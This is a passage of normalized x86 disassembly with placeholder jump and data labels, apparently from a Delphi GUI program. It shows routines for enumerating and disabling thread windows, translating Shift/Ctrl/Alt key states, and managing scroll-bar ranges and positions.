mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_45724f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_457218
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_45715c
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457256
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_457260
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4026fc
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_457298
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_4572fc
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_457298
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_457358
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_457378
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_457358
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_4573a4
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_45defc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_45e36c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407f98
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45dee8
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45e358
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407f98
test eax eax
je r-xdata
sub_457424
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_457478
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_4574b4
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_457500
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45755e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_454778
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404128
mov eax [ ebp - 0x8 ]
pop edx
call sub_407f98
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457565
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
sub_457570
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_457598
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_457609
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_457570
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457610
lea eax [ ebp - 0xc ]
call sub_403f40
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
call sub_4038f8
sub_457618
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40313c
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_4576a8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4184a8
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_457f70
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_457f50
mov edx [ edi + 0xc ]
mov eax ebx
call sub_457e00
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4576f8
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4578b0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_440224
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_457e00
xor edx edx
mov eax ebx
call sub_457e00
jmp r-xdata
sub_457730
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_428c48
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_45779c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_428c48
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_457804
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_457f38
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4430fc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_457f38
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4430c0
call sub_45779c
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4430c0
call sub_457730
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_4578b0
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_446450
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4578e8
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_446450
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_45791c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4578e8
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4578e8
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_457998
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_446450
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_45791c
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43f5b4
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_45791c
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43f5f8
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_457a30
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_446450
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_457a90
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_457c61 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_457e00
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_457e00
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_457998
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_457e00
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_457998
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457e00
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_457e00
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_457e00
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_457e00
jmp r-xdata
push ebp
call sub_457a30
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_457e00
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_457e00
jmp r-xdata
push ebp
call sub_457a30
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_457e00
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406c80
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_457e00
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457e00
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_457e00
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457e00
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_457e00
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457e00
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_457e00
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457e00
jmp r-xdata
sub_457d88
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_458478
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_457e00
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_446450
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_446450
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_446008
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_446008
jmp r-xdata
call sub_457570
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_457ec4
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_458478
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_457f7c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_446450
push eax
call sub_42a870
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_446450
push eax
call sub_42a870
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_446450
push eax
call sub_42a870
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_42154c
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_446450
push eax
call sub_42a870
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_446450
push eax
call sub_42a870
sub_458084
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_457998
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_457998
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_457f7c
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_446450
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_457e00
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_457998
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_45819c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4420f8
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_457618
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_457618
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_458214
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_40316c
mov eax [ esi + 0x20c ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44221c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_458260
push ebx
mov ebx eax
mov eax ebx
call sub_443384
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_458478
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40c1fc
test al al
jne r-xdata
mov eax ebx
call sub_446450
push eax
call sub_42a8a4
sub_4582a0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4583f8
mov ecx edi
mov edx esi
mov eax ebx
call sub_442acc
pop edi
pop esi
pop ebx
retn
sub_4582e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4583e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43f5b4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_4578b0
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
